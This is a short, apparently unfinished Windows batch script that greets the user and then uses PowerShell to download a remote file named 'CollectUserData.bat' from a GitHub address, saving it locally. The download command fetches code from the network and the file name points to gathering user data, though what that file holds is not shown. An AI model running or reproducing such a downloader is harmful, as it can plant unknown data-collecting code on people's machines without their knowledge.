@echo off
echo Hi
pause
cls
powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BlakeeBobz/windows.bat/main/CollectUserData.bat' -OutFile 'file.ext'}"
echo Downloaded CollectUserData.bat.
pause

::wip
